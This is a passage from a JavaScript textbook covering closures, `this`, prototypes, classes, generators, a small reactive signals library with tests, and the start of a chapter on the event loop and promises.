**Unit 5.5, Q1.** A `ReferenceError` (temporal dead zone: even `typeof` cannot touch `x` before its declaration); `"undefined"` for the undeclared `y` — `typeof` is the one operator allowed on undeclared names.

**Unit 5.6, Q1.** It throws a `DataCloneError`: functions cannot be cloned.

# Chapter 6 — Functions, Closures, `this`, Prototypes, and Classes

*Goal: understand the machinery behind JavaScript's objects and functions. Functions are values that remember where they were created (closures); `this` is decided at each call; objects inherit through a chain of prototypes, and classes are a clear syntax for building those chains, with genuinely private fields; generators make any object iterable and pipelines lazy. The project uses all of it to build a small reactive "signals" library — the idea behind the state systems of modern front-end frameworks.*

**What you will be able to do after this chapter**

- Choose between function declarations, expressions, and arrow functions, and use default and rest parameters.
- Use closures for private state, memoisation, and one-time initialisation.
- Predict `this` in every kind of call, and fix lost-`this` bugs.
- Explain property lookup through the prototype chain, and what `class` and `extends` set up.
- Write classes with private fields, accessors, static members, and inheritance.
- Implement the iteration protocol with generators and build lazy pipelines.

## Topic 6A — Functions

## Unit 6.1 — Functions as values

**One-line summary:** Function declarations are hoisted with their bodies, function expressions and arrow functions exist from the line that creates them, arrow functions have no `this`, `arguments`, or `prototype` of their own, and every function is an ordinary value that can be passed, returned, and stored.

```js
// file: functions/functions.mjs
// Three ways to write a function, and what differs between them.
console.log(square(4));                                   // declarations are hoisted with their body
function square(x) { return x * x; }

const cube = function (x) { return x ** 3; };              // expression: usable after this line
const half = (x) => x / 2;                                 // arrow: no own this, arguments, or prototype

function greet(name = "world", ...rest) {                  // default and rest parameters
  return `hello ${name}` + (rest.length ? ` (+${rest.length} more)` : "");
}
console.log(cube(2), half(9), greet(), greet("Ana", "Bo", "Cy"), greet(undefined), greet(null));
console.log(square.length, greet.length, square.name, cube.name, half.name, typeof half.prototype);

const twice = (f) => (x) => f(f(x));                      // functions are values: take and return them
console.log(twice(square)(3), [1, 2, 3].map(twice(half)));
console.log(["1", "2", "3"].map(parseInt), ["1", "2", "3"].map((s) => parseInt(s, 10)));
```

```console
$ cd functions && node functions.mjs
16
8 4.5 hello world hello Ana (+2 more) hello world hello null
1 0 square cube half undefined
81 [ 0.25, 0.5, 0.75 ]
[ 1, NaN, NaN ] [ 1, 2, 3 ]
```

`greet(undefined)` uses the default but `greet(null)` does not: defaults apply only to `undefined`. A function's `length` counts the parameters before the first default or rest parameter. `twice` takes a function and returns a new one — a *higher-order function*. The last line is a famous trap: `map` calls its callback with `(element, index, array)`, and `parseInt` takes `(string, radix)`, so `parseInt("2", 1)` and `parseInt("3", 2)` are `NaN`.

### Mastery check

1. **Predict.** `["10", "10", "10"].map(parseInt)`.

## Unit 6.2 — Closures

**One-line summary:** A function keeps access to the variables of the scope it was created in, for as long as the function exists; this is how JavaScript makes private state, caches, and configured functions without classes — each call to the outer function creates a fresh set of captured variables.

```js
// file: functions/closures.mjs
// A closure is a function together with the variables it captured from where it was created.
function makeCounter(step = 1) {
  let count = 0;                                           // private: only the closures below see it
  return { next: () => (count += step), reset: () => { count = 0; } };
}
const a = makeCounter(), b = makeCounter(10);
a.next(); a.next(); b.next();
console.log(a.next(), b.next(), "count" in a);

function memoize(fn) {
  const cache = new Map();
  return (n) => {
    if (!cache.has(n)) cache.set(n, fn(n));
    return cache.get(n);
  };
}
let calls = 0;
const fib = memoize((n) => (calls++, n < 2 ? n : fib(n - 1) + fib(n - 2)));
console.log(fib(78), `computed with ${calls} calls; without the cache: ${2n * 14472334024676221n - 1n}`);

function once(fn) {
  let done = false, result;
  return function (...args) {                              // a regular function keeps the caller's this
    if (!done) { done = true; result = fn.apply(this, args); }
    return result;
  };
}
const init = once(() => { console.log("initialising"); return 42; });
console.log(init(), init());
```

```console
$ cd functions && node closures.mjs
3 20 false
8944394323791464 computed with 79 calls; without the cache: 28944668049352441
initialising
42 42
```

`a` and `b` have separate `count` variables, invisible from outside (`"count" in a` is false). The memoised Fibonacci makes 79 calls for `fib(78)` — the naive recursion would make about 2.9 × 10¹⁶. `once` returns a regular `function`, not an arrow, so that it passes on the `this` it was called with.

### Deep & Tricky

**DT-22. A closure keeps alive the *variables* it can see, not copies of their values — and engines may keep the whole captured scope alive for as long as any closure created in it exists. A small event handler created in the same function as a large buffer can therefore keep the buffer in memory even if the handler never uses it, when another closure from that scope does: V8 allocates one context object per scope, shared by all its closures.** *(ECMA-262 §9.1 Environment Records — closures capture environments, not values; V8 implementation: "context" objects shared by all closures of a scope, a well-known source of leaks)* Heap snapshots in DevTools show such retained contexts under "(closure)" and "system / Context" entries.

### Mastery check

1. **Predict.** After `const c = makeCounter(); const d = c;` what does `d.next()` return after `c.next()` was called twice?

## Unit 6.3 — `this`

**One-line summary:** `this` is not where a function is defined but how it is called: `obj.method()` sets it to `obj`; a plain call `f()` sets it to `undefined` in strict code (modules and classes are always strict); `call`, `apply`, and `bind` set it explicitly; `new` sets it to a fresh object; and arrow functions ignore all of these and use the `this` of the enclosing code.

```js
// file: functions/this.mjs
// The value of this is decided by HOW a function is called, not where it is defined.
const counter = {
  count: 0,
  increment() { this.count++; return this.count; },
  incrementLater() { setTimeout(function () { console.log("callback this:", this === counter ? "counter" : typeof this); }, 0); },
  incrementLaterArrow() { setTimeout(() => console.log("arrow this:", this === counter ? "counter" : typeof this), 0); },
};
console.log("method call:", counter.increment());                         // implicit: the object before the dot
const extracted = counter.increment;
try { extracted(); } catch (e) { console.log("extracted call:", `${e.name}: ${e.message}`); }  // modules are strict: this is undefined
console.log("call/apply:", extracted.call({ count: 41 }));                 // explicit
const bound = counter.increment.bind(counter);
console.log("bound:", bound(), bound.call({ count: 100 }));                // bind cannot be overridden
function Point(x) { this.x = x; }
console.log("new:", new Point(3));                                         // new: a fresh object
counter.incrementLater();
counter.incrementLaterArrow();
```

```console
$ cd functions && node this.mjs
method call: 1
extracted call: TypeError: Cannot read properties of undefined (reading 'count')
call/apply: 42
bound: 2 3
new: Point { x: 3 }
callback this: object
arrow this: counter
```

Extracting a method (`const extracted = counter.increment`) loses the object: called alone, `this` is `undefined` and the method crashes. The same happens when a method is passed as a callback — `setTimeout(obj.method)`, `button.addEventListener("click", obj.method)`. The fixes are `bind`, or an arrow function wrapper. Inside the `setTimeout` callback, a regular `function` gets whatever `this` the caller provides (Node passes the timer object; browsers pass `window` or `undefined`), while the arrow function sees `counter`, the `this` of `incrementLaterArrow`.

### Mastery check

1. **Predict.** `const o = { name: "o", f: () => this }; o.f()` in a module?

## Topic 6B — Objects

## Unit 6.4 — Prototypes

**One-line summary:** Every object has a hidden link to another object, its prototype; reading a property looks at the object, then its prototype, then the prototype's prototype, until `null`; assigning a property always creates or changes an *own* property; and built-in methods such as `push` and `toString` are found this way, on `Array.prototype` and `Object.prototype`.

```js
// file: objects/proto.mjs
// Property lookup walks the prototype chain; classes are a syntax for setting it up.
const animal = { kind: "animal", describe() { return `${this.name} is a ${this.kind}`; } };
const dog = Object.create(animal);                         // dog's prototype is animal
dog.name = "Rex";
console.log(dog.describe(), "| own keys:", Object.keys(dog), "| proto is animal:", Object.getPrototypeOf(dog) === animal);
dog.kind = "dog";                                          // assignment creates an OWN property (shadowing)
console.log(dog.describe(), "| animal.kind still:", animal.kind);
animal.legs = 4;                                           // later additions to the prototype are visible
console.log("legs" in dog, Object.hasOwn(dog, "legs"), dog.legs);

// The chain of an ordinary array and a function:
const chain = (o) => { const names = []; for (let p = Object.getPrototypeOf(o); p; p = Object.getPrototypeOf(p))
  names.push(p === Object.prototype ? "Object.prototype" : p === Array.prototype ? "Array.prototype"
             : p === Function.prototype ? "Function.prototype" : "?"); return names.join(" -> "); };
console.log("[]:", chain([]), "| function:", chain(() => {}));

const bare = Object.create(null);                          // no prototype at all: a safe dictionary
bare.toString = "just data";
console.log("toString" in {}, "constructor" in {}, Object.keys(bare), typeof bare.hasOwnProperty);
```

```console
$ cd objects && node proto.mjs
Rex is a animal | own keys: [ 'name' ] | proto is animal: true
Rex is a dog | animal.kind still: animal
true false 4
[]: Array.prototype -> Object.prototype | function: Function.prototype -> Object.prototype
true true [ 'toString' ] undefined
```

`dog` has only one own property, yet `dog.describe()` works: it is found on `animal`, and inside it `this` is `dog`. Assigning `dog.kind` shadows the prototype's `kind` without changing it. A property added to the prototype later is visible through every object that inherits from it — which is why modifying built-in prototypes (`Array.prototype.myHelper = …`) affects all code on the page. `Object.create(null)` makes an object with no prototype, safe as a dictionary for arbitrary keys.

### Deep & Tricky

**DT-23. Using an ordinary object as a dictionary of user-supplied keys is unsafe: keys such as `"constructor"`, `"toString"`, or `"hasOwnProperty"` are found on `Object.prototype` (`"constructor" in {}` is true), and assigning the key `"__proto__"` does not create a property at all but *changes the object's prototype* — the root of "prototype pollution" vulnerabilities when JSON input is merged into objects. Use `Map`, `Object.create(null)`, and `Object.hasOwn`.** *(ECMA-262 §B.2.1 "Object.prototype.__proto__" accessor; Annex B; OWASP "Prototype Pollution Prevention Cheat Sheet")*

### Mastery check

1. **Predict.** `const o = {}; o["__proto__"] = { admin: true }; console.log(o.admin, Object.keys(o));`

## Unit 6.5 — Classes

**One-line summary:** `class` creates a constructor function whose `prototype` holds the methods; `extends` links one class's prototype to another's and `super` calls the parent; fields are created on each instance; `#private` fields and methods are truly inaccessible outside the class body; `get`/`set` define accessors; and `static` members belong to the class itself.

```js
// file: objects/classes.mjs
// Classes: constructor, fields, private members, accessors, statics, and inheritance.
class Account {
  static #count = 0;                                       // private static field
  #balance = 0;                                            // private instance field: truly inaccessible
  owner;                                                   // public field, created on each instance
  constructor(owner) { this.owner = owner; Account.#count++; }
  deposit(cents) {
    if (!Number.isInteger(cents) || cents <= 0) throw new RangeError("deposit must be positive cents");
    this.#balance += cents;
    return this;                                           // allows chaining
  }
  get balance() { return this.#balance; }                  // read-only from outside
  static get count() { return Account.#count; }
  toString() { return `${this.owner}: ${this.#balance}`; }
}

class SavingsAccount extends Account {
  constructor(owner, rate) { super(owner); this.rate = rate; }   // super() must come before this
  addInterest() { return this.deposit(Math.round(this.balance * this.rate)); }
  toString() { return `${super.toString()} (savings at ${this.rate * 100}%)`; }
}

const s = new SavingsAccount("Ana", 0.02).deposit(10_000).addInterest();
console.log(String(s), "| balance", s.balance, "| accounts", Account.count);
try { s.balance = 5; } catch (e) { console.log(`${e.name}: ${e.message}`); }   // no setter; modules are strict
console.log("keys", Object.keys(s), "| JSON", JSON.stringify(s), "| private fields are not properties");
try { s.deposit(1.5); } catch (e) { console.log(`${e.name}: ${e.message}`); }
console.log(typeof Account, Object.getPrototypeOf(SavingsAccount.prototype) === Account.prototype,
            s instanceof Account, Object.getOwnPropertyNames(Account.prototype));
```

```console
$ cd objects && node classes.mjs
Ana: 10200 (savings at 2%) | balance 10200 | accounts 1
TypeError: Cannot set property balance of [object Object] which has only a getter
keys [ 'owner', 'rate' ] | JSON {"owner":"Ana","rate":0.02} | private fields are not properties
RangeError: deposit must be positive cents
function true true [ 'constructor', 'deposit', 'balance', 'toString' ]
```

The private `#balance` is not a property: it does not appear in `Object.keys` or `JSON.stringify`, and no code outside the class can read or write it (unlike the old `_balance` convention). Assigning to an accessor without a setter throws in strict code. A class is still a function, and `extends` simply links the two prototype objects; the methods live on `Account.prototype`, shared by all instances.

### Pattern

**P-6. Prefer composition — objects that hold other objects and plain functions — over deep inheritance hierarchies; use `extends` for genuine "is-a" relationships one or two levels deep, and `#private` fields for invariants that callers must not break.** *(Gamma et al., "Design Patterns", "favor object composition over class inheritance"; ECMA-262 §15.7 Class Definitions)* *Trade-off:* private fields cannot be accessed by subclasses, by tests, or through `Proxy` wrappers (a proxy of an object with private fields throws when its methods run), so overusing them can make code harder to extend and to test.

### Mastery check

1. **Predict.** In `SavingsAccount`'s constructor, what happens if `this.rate = rate` is written before `super(owner)`?

## Unit 6.6 — Iterators and generators

**One-line summary:** An object is iterable if it has a `[Symbol.iterator]` method returning an iterator — an object whose `next()` returns `{ value, done }`; generator functions (`function*` with `yield`) produce such iterators automatically, run lazily one step at a time, can receive values back through `next(v)`, and run their `finally` blocks when the consumer stops early.

```js
// file: objects/iter.mjs
// The iteration protocol, and generators as the easy way to implement it.
class Range {
  constructor(from, to) { this.from = from; this.to = to; }
  *[Symbol.iterator]() { for (let i = this.from; i <= this.to; i++) yield i; }   // a generator method
}
console.log([...new Range(1, 5)], Math.max(...new Range(3, 7)));

function* naturals() { let n = 0; while (true) yield n++; }       // infinite, but lazy
function* take(it, n) { for (const x of it) { if (n-- <= 0) return; yield x; } }
function* map(it, f) { for (const x of it) yield f(x); }
console.log([...take(map(naturals(), (n) => n * n), 6)]);
console.log(naturals().filter((n) => n % 7 === 0).map((n) => n * 2).take(4).toArray());   // ES2025 iterator helpers

const gen = (function* () {
  try {
    const got = yield "first";                                    // yield also RECEIVES a value
    console.log("generator received", got);
    yield "second";
  } finally {
    console.log("generator cleaned up");                          // runs on return() too
  }
})();
console.log(gen.next(), gen.next(42), gen.return("stopped"), gen.next());

const it = [10, 20, 30][Symbol.iterator]();
for (const x of it) { console.log("first loop", x); break; }      // break calls it.return() ...
for (const x of it) console.log("second loop", x);               // ... but array iterators have none: it resumes
```

```console
$ cd objects && node iter.mjs
[ 1, 2, 3, 4, 5 ] 7
[ 0, 1, 4, 9, 16, 25 ]
[ 0, 14, 28, 42 ]
generator received 42
generator cleaned up
{ value: 'first', done: false } { value: 'second', done: false } { value: 'stopped', done: true } { value: undefined, done: true }
first loop 10
second loop 20
second loop 30
```

`Range` becomes usable with spread, `for…of`, and `Math.max(...)` by adding a generator method. `naturals()` is infinite, but `take` and `map` pull only six values. Newer engines have the same helpers built in on every iterator (`filter`, `map`, `take`, `toArray`: ES2025). The hand-driven generator shows the two-way channel: the value passed to the second `next(42)` becomes the result of the first `yield`, and `return()` triggers the `finally` block.

### Deep & Tricky

**DT-24. `break` inside `for…of` calls the iterator's `return()` method, which closes generators for good — but iterators without a `return` method, such as array and string iterators, are simply abandoned and can be resumed: the second loop above continues with 20 and 30. Conversely, a generator object passed to two loops yields nothing the second time, because the first `break` finished it.** *(ECMA-262 §7.4.11 IteratorClose and §14.7.5.7 ForIn/OfBodyEvaluation; §27.5.3.4 Generator.prototype.return)*

### Mastery check

1. **Predict.** `const g = naturals(); for (const x of g) if (x > 2) break; console.log([...take(g, 2)]);`

## Chapter 6 Project — A reactive signals library

### Requirements

Write a small reactive library of the kind front-end frameworks are built on:

- `signal(v)` holds a value; reading `.value` inside a computation subscribes to it; writing it notifies subscribers, but only if the value actually changed (`Object.is`).
- `computed(fn)` derives a value lazily (computed only when read) and caches it until a dependency changes; dependencies are tracked automatically and may change from run to run.
- `effect(fn)` runs immediately and again after its dependencies change; it may return a cleanup function; it returns a `dispose` function.
- `batch(fn)` applies several writes and runs each affected effect once.
- No glitches: in a "diamond" (one signal feeding two computeds feeding a third), an effect runs once per change and never sees half-updated values.

### Reference solution

```js
// file: project/signals.mjs
// A small reactive library: signals hold values, computeds derive values from them lazily,
// and effects re-run when what they read changes. Built from closures, classes, and private fields.

let current = null;               // the computed or effect currently being evaluated (it records reads)
let batchDepth = 0;
const pending = new Set();        // effects waiting to run

class Node {
  #sources = new Set();           // nodes I read last time
  #observers = new Set();         // nodes that read me
  track() {                       // called when someone reads this node
    if (current) { this.#observers.add(current); current.#sources.add(this); }
  }
  forgetSources() {               // dependencies are dynamic: rebuild them on every run
    for (const s of this.#sources) s.#observers.delete(this);
    this.#sources.clear();
  }
  notify() {                      // my value may have changed: tell everything downstream
    for (const o of [...this.#observers]) o.stale();
  }
  stale() {}
  get observerCount() { return this.#observers.size; }
}

class Signal extends Node {
  #value;
  constructor(value) { super(); this.#value = value; }
  get value() { this.track(); return this.#value; }
  set value(v) {
    if (Object.is(v, this.#value)) return;          // no change, no work
    this.#value = v;
    batch(() => this.notify());
  }
  peek() { return this.#value; }                     // read without subscribing
}

class Computed extends Node {
  #fn; #value; #dirty = true;
  constructor(fn) { super(); this.#fn = fn; }
  stale() { if (!this.#dirty) { this.#dirty = true; this.notify(); } }
  get value() {
    this.track();
    if (this.#dirty) {                               // pull: recompute only when read
      this.forgetSources();
      const prev = current; current = this;
      try { this.#value = this.#fn(); } finally { current = prev; }
      this.#dirty = false;
    }
    return this.#value;
  }
}

class Effect extends Node {
  #fn; #cleanup; #disposed = false;
  constructor(fn) { super(); this.#fn = fn; this.run(); }
  stale() { pending.add(this); }
  run() {
    if (this.#disposed) return;
    this.#cleanup?.();
    this.forgetSources();
    const prev = current; current = this;
    try { this.#cleanup = this.#fn(); } finally { current = prev; }
  }
  dispose() { this.#disposed = true; this.#cleanup?.(); this.forgetSources(); }
}

export function batch(fn) {
  batchDepth++;
  try { fn(); } finally {
    if (--batchDepth === 0)
      for (const e of pending) { pending.delete(e); e.run(); }   // a Set iterates items added during the loop
  }
}
export const signal = (v) => new Signal(v);
export const computed = (fn) => new Computed(fn);
export const effect = (fn) => { const e = new Effect(fn); return () => e.dispose(); };
```

```js
// file: project/demo.mjs
import { signal, computed, effect, batch } from "./signals.mjs";

const first = signal("Ada"), last = signal("Lovelace"), showFull = signal(true);
let computations = 0;
const full = computed(() => (computations++, `${first.value} ${last.value}`));
const label = computed(() => (showFull.value ? full.value : first.value));    // dynamic dependencies

const stop = effect(() => console.log(`render: ${label.value}`));
first.value = "Augusta";                       // one re-render
batch(() => { first.value = "Ada"; last.value = "King"; });   // two changes, one re-render
showFull.value = false;                        // label no longer reads `full` ...
last.value = "Byron";                          // ... so this change re-renders nothing
console.log(`full was computed ${computations} times; last has ${last.observerCount} observers`);
stop();
first.value = "Grace";                         // disposed: no render
```

```js
// file: project/test.mjs
import assert from "node:assert/strict";
import { signal, computed, effect, batch } from "./signals.mjs";

{ // a diamond: d depends on b and c, which both depend on a. One change must run the effect once,
  // and the effect must never see a "glitch" (b updated but c not yet).
  const a = signal(1);
  const b = computed(() => a.value * 2), c = computed(() => a.value * 3);
  const d = computed(() => `${b.value}+${c.value}=${b.value + c.value}`);
  const seen = [];
  effect(() => { seen.push(d.value); });
  a.value = 2;
  assert.deepEqual(seen, ["2+3=5", "4+6=10"]);
}
{ // setting the same value does nothing; batching coalesces
  const s = signal(1); let runs = 0;
  effect(() => { s.value; runs++; });
  s.value = 1;
  batch(() => { s.value = 2; s.value = 3; batch(() => { s.value = 4; }); });
  assert.equal(runs, 2);
}
{ // cleanup runs before each re-run and on dispose
  const s = signal(0); const log = [];
  const stop = effect(() => { const v = s.value; log.push(`run ${v}`); return () => log.push(`clean ${v}`); });
  s.value = 1; stop(); s.value = 2;
  assert.deepEqual(log, ["run 0", "clean 0", "run 1", "clean 1"]);
}
{ // an exception inside a computed must not leave the tracking context corrupted
  const s = signal(0);
  const bad = computed(() => { if (s.value === 1) throw new Error("boom"); return s.value; });
  assert.equal(bad.value, 0);
  s.value = 1;
  assert.throws(() => bad.value, /boom/);
  const other = signal("x"); let reads = 0;
  effect(() => { other.value; reads++; });
  other.value = "y";
  assert.equal(reads, 2);
}
{ // computeds are lazy: nothing is computed until something reads them
  let n = 0; const s = signal(1); const c = computed(() => (n++, s.value + 1));
  s.value = 2; s.value = 3;
  assert.equal(n, 0); assert.equal(c.value, 4); assert.equal(c.value, 4); assert.equal(n, 1);
}
console.log("all signal tests passed");
```

```console
$ cd project && node demo.mjs
render: Ada Lovelace
render: Augusta Lovelace
render: Ada King
render: Ada
full was computed 3 times; last has 1 observers
$ cd project && node test.mjs
all signal tests passed
```

Each kind of node is a class, and the dependency graph lives in private fields of the common base class — a subclass instance can use `#sources` because the field was installed by `Node`'s constructor. Tracking is a single module-level variable, `current`, saved and restored around each evaluation (in a `finally`, so an exception cannot leave it pointing at the wrong node — one of the tests checks exactly that). Writes mark computeds dirty and queue effects; effects run at the end of the outermost batch and *pull* fresh values, so a diamond is recomputed once, in a consistent state.

The demo also shows a limitation worth knowing. After `showFull` becomes false, the effect no longer depends on `full`, and changing `last` re-renders nothing — but `last` still has one observer: `full` itself, which keeps its subscription until it is next recomputed. Production libraries unsubscribe a computed from its sources when it loses its last observer, so that unused parts of the graph can be garbage-collected.

### Review checklist

- What happens if an effect writes to a signal it reads? Add a guard against infinite loops.
- Implement the unsubscribe-when-unobserved behaviour described above, and test it with `observerCount`.
- How would you make effects run asynchronously (in a microtask) instead of synchronously? What changes for callers? (Chapter 7.)

## Answers to the Chapter 6 prediction questions

**Unit 6.1, Q1.** `[10, NaN, 2]`: radix 0 means "auto" (decimal), radix 1 is invalid, and "10" in base 2 is 2.

**Unit 6.2, Q1.** 3: `c` and `d` refer to the same object with the same closure.

**Unit 6.3, Q1.** `undefined`: the arrow function takes `this` from the module's top level, where it is `undefined` — not `o`.

**Unit 6.4, Q1.** `true []`: the assignment set the prototype of `o` to `{ admin: true }` rather than creating an own property.

**Unit 6.5, Q1.** A `ReferenceError`: in a derived class, `this` is uninitialised until `super()` returns.

**Unit 6.6, Q1.** `[]`: the `break` closed the generator, so it yields nothing more.

# Chapter 7 — Asynchronous JavaScript: The Event Loop, Promises, and `async`/`await`

*Goal: understand when JavaScript code runs. JavaScript executes on one thread, one task at a time, and everything asynchronous — timers, network responses, user input — is a callback queued for later. This chapter makes the scheduling visible: the order of tasks and microtasks in Node.js and in the browser, promises and how errors flow through them, `async`/`await` and the parallelism it hides, the combinators and `AbortSignal` for timeouts and cancellation, and what one long computation does to a page. The project is a task pool with a concurrency limit, retries with backoff, timeouts, and cancellation.*

**What you will be able to do after this chapter**

- Predict the order in which synchronous code, microtasks, and tasks run.
- Chain promises and route errors correctly; never lose a rejection.
- Use `async`/`await` without accidentally serialising independent work.
- Combine promises with `all`, `allSettled`, `race`, and `any`, and cancel work with `AbortSignal`.
- Keep a page responsive by breaking up long tasks.

## Topic 7A — The event loop

## Unit 7.1 — Tasks and microtasks

**One-line summary:** The event loop takes one *task* from a queue (a timer callback, an I/O completion, a user event), runs it to completion, then runs *every* microtask (promise reactions, `queueMicrotask`, code after an `await`) before taking the next task — so a microtask always runs before any timer, however short.

```js
// file: loop/order.mjs
// In what order do these run? Synchronous code first, then microtasks, then the next task.
console.log("script start");
setTimeout(() => console.log("timeout (a task)"), 0);
Promise.resolve().then(() => console.log("promise reaction (a microtask)"));
queueMicrotask(() => console.log("queueMicrotask"));
process.nextTick(() => console.log("process.nextTick (Node only)"));
(async () => {
  console.log("async function body: runs synchronously until the first await");
  await null;
  console.log("after await (a microtask)");
})();
setTimeout(() => {
  console.log("second timeout");
  Promise.resolve().then(() => console.log("microtask queued by a task runs before the next task"));
  process.nextTick(() => console.log("nextTick queued by a task"));
}, 0);
setTimeout(() => console.log("third timeout"), 0);
console.log("script end");
```

```console
$ cd loop && node order.mjs
script start
async function body: runs synchronously until the first await
script end
promise reaction (a microtask)
queueMicrotask
after await (a microtask)
process.nextTick (Node only)
timeout (a task)
second timeout
nextTick queued by a task
microtask queued by a task runs before the next task
third timeout
$ cd loop && cp order.mjs order.cjs && node order.cjs
script start
async function body: runs synchronously until the first await
script end
process.nextTick (Node only)
promise reaction (a microtask)
queueMicrotask
after await (a microtask)
timeout (a task)
second timeout
nextTick queued by a task
microtask queued by a task runs before the next task
third timeout
```

The script itself is the first task; it runs to the end, including the body of the async function up to its `await`. Then the microtasks run in the order they were queued, and only then the timers, each followed by the microtasks it queued. Node's `process.nextTick` queue is separate, and the two runs above disagree about it: in the ES module it ran *after* the promise reactions, in the CommonJS copy (`.cjs`) *before* them.

### Deep & Tricky

**DT-25. `process.nextTick` callbacks normally run before promise microtasks, but the top level of an ES module is itself evaluated inside a promise job, so the microtask queue is drained first and `nextTick` callbacks queued at module top level run after them. Code that relies on `nextTick` running "before any promise" behaves differently when a project switches from CommonJS to ES modules.** *(Node.js documentation, "process.nextTick() … vs queueMicrotask()": "within an ESM module … the nextTick queue is processed after the microtask queue"; ECMA-262 §16.2.1.5.3 module evaluation via promise capabilities)* Use `queueMicrotask` when the order matters; it is the same in both module systems and in browsers.

The browser adds rendering to the loop: between tasks, at most once per display frame, it runs `requestAnimationFrame` callbacks, recalculates style and layout, and paints.

```html
<!-- file: loop/order.html -->
<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8"><title>Event loop order in a browser</title></head>
<body>
  <script>
    const t0 = performance.now(), at = () => `${(performance.now() - t0).toFixed(1)} ms`;
    console.log(`script start`);
    setTimeout(() => console.log(`timeout 0 at ${at()}`), 0);
    requestAnimationFrame(() => console.log(`requestAnimationFrame (before the next paint) at ${at()}`));
    Promise.resolve().then(() => console.log(`microtask`));
    const ch = new MessageChannel();
    ch.port1.onmessage = () => console.log(`MessageChannel message (a task) at ${at()}`);
    ch.port2.postMessage(null);
    let n = 0, last = performance.now(); const gaps = []; const nest = () => { const now = performance.now(); gaps.push((now - last).toFixed(1)); last = now; if (++n < 10) setTimeout(nest, 0); else console.log(`gaps between 10 nested timeouts (ms): ${gaps.join(" ")}`); };
    setTimeout(nest, 0);
    console.log(`script end`);
  </script>
</body>
</html>
```

```console
$ cd loop && python3 ../../tools/page.py order.html wait:200
script start
script end
microtask
timeout 0 at 4.1 ms
MessageChannel message (a task) at 4.5 ms
requestAnimationFrame (before the next paint) at 5.4 ms
gaps between 10 nested timeouts (ms): 4.2 1.5 0.1 0.0 0.0 0.0 4.1 4.2 4.1 4.2
```

The microtask runs first, then the timer and the `MessageChannel` message (both tasks), and the animation-frame callback when the next frame is due. The nested timeouts show a deliberate browser rule: after five levels of nesting, `setTimeout(…, 0)` is clamped to at least 4 ms (the gaps jump from 0 to about 4).

### Mastery check

1. **Predict.** `setTimeout(() => console.log("A")); Promise.resolve().then(() => { console.log("B"); setTimeout(() => console.log("C")); }); console.log("D");`

## Topic 7B — Promises

## Unit 7.2 — Promises and error flow

**One-line summary:** A promise is pending, then fulfilled with a value or rejected with a reason, once; `then` returns a *new* promise for the callback's result, so chains pass values along, a thrown error skips to the next `catch`, a `catch` that returns normally recovers the chain, and promises (and any object with a `then` method) are unwrapped automatically.

```js
// file: async/promises.mjs
// A promise is a placeholder for a value that arrives later; then() chains, and errors skip ahead.
import { setTimeout as sleep } from "node:timers/promises";

const delay = (ms, value) => new Promise((resolve) => setTimeout(() => resolve(value), ms));
const p = delay(50, 21);
console.log("right after creation:", p);
p.then((v) => v * 2)                                       // each then returns a NEW promise
 .then((v) => { console.log("chained result", v); throw new Error("step 3 failed"); })
 .then(() => console.log("never runs"))                    // skipped: the chain is rejected
 .catch((e) => { console.log("caught:", e.message); return "recovered"; })
 .then((v) => console.log("after catch:", v))
 .finally(() => console.log("finally (no value, cannot change the result)"));

await sleep(100);
const resolved = Promise.resolve(Promise.resolve("unwrapped"));   // promises flatten: no promise of a promise
console.log(await resolved, (await Promise.resolve({ then: (ok) => ok("a thenable") })));
const { promise, resolve } = Promise.withResolvers();             // ES2024: resolve from outside
setTimeout(() => resolve("resolved from a timer"), 10);
console.log(await promise);
```

```console
$ cd async && node promises.mjs
right after creation: Promise { <pending> }
chained result 42
caught: step 3 failed
after catch: recovered
finally (no value, cannot change the result)
unwrapped a thenable
resolved from a timer
```

`Promise.withResolvers()` gives the promise together with its `resolve` and `reject` functions, for code where the completion happens elsewhere (a callback API, an event). The other rule of promises: *every rejection must be handled*.

```js
// file: async/unhandled.mjs
// A rejected promise that nobody handles crashes a Node.js process (since Node 15).
const load = async () => { throw new Error("config file missing"); };
load();                                   // forgot await / catch
setTimeout(() => console.log("never printed: the process is already gone"), 100);
```

```console
$ cd async && node unhandled.mjs
file://async/unhandled.mjs:3
const load = async () => { throw new Error("config file missing"); };
                                 ^

Error: config file missing
    at load (file://async/unhandled.mjs:3:34)
    at file://async/unhandled.mjs:4:1
    at ModuleJob.run (node:internal/modules/esm/module_job:343:25)
    at async onImport.tracePromise.__proto__ (node:internal/modules/esm/loader:681:26)
    at async asyncRunEntryPointWithESMLoader (node:internal/modules/run_main:117:5)

Node.js v22.23.4
```

Node.js terminates the process on an unhandled rejection; browsers report it in the console as "Uncaught (in promise)" and fire an `unhandledrejection` event.

### Mastery check

1. **Predict.** `Promise.reject(new Error("x")).then(() => 1, () => 2).then((v) => console.log(v))`.

## Unit 7.3 — `async`/`await` and accidental serialisation

**One-line summary:** An `async` function returns a promise and can `await` other promises, which suspends it without blocking anything else; but each `await` waits before the next line starts, so independent operations must be started first and awaited together (`Promise.all`), and array methods such as `forEach` and `map` do not wait for async callbacks at all.

```js
// file: async/timing.mjs
// await makes code look sequential; that is exactly the problem when the work could be parallel.
const fetchUser = (id) => new Promise((r) => setTimeout(() => r({ id }), 100));
const t = () => performance.now();

let start = t();
const a = await fetchUser(1), b = await fetchUser(2), c = await fetchUser(3);   // one after another
console.log(`sequential awaits: ${Math.round(t() - start)} ms`);

start = t();
const users = await Promise.all([1, 2, 3].map(fetchUser));                     // all at once
console.log(`Promise.all:       ${Math.round(t() - start)} ms ->`, users.map((u) => u.id));

start = t();
const seen = [];
[1, 2, 3].forEach(async (id) => seen.push((await fetchUser(id)).id));          // forEach does not wait
console.log(`forEach(async):    ${Math.round(t() - start)} ms, seen so far:`, seen);

start = t();
for (const id of [1, 2, 3]) seen.push((await fetchUser(id)).id);               // for...of does
console.log(`for...of + await:  ${Math.round(t() - start)} ms, seen:`, seen);
```

```console
$ cd async && node timing.mjs
sequential awaits: 301 ms
Promise.all:       100 ms -> [ 1, 2, 3 ]
forEach(async):    0 ms, seen so far: []
for...of + await:  301 ms, seen: [ 1, 2, 3, 1, 2, 3 ]
```

Three 100-ms calls take 300 ms when awaited one by one and 100 ms with `Promise.all`. The `forEach` version returns immediately with nothing collected: `forEach` ignores the promises its callback returns. Its pushes happened later, during the `for…of` loop — that is why `seen` ends with six entries. When order matters and the operations must not overlap, use `for…of` with `await`; when they may overlap, start them all and use `Promise.all` — or, for hundreds of them, a pool with a concurrency limit (this chapter's project).

### Mastery check

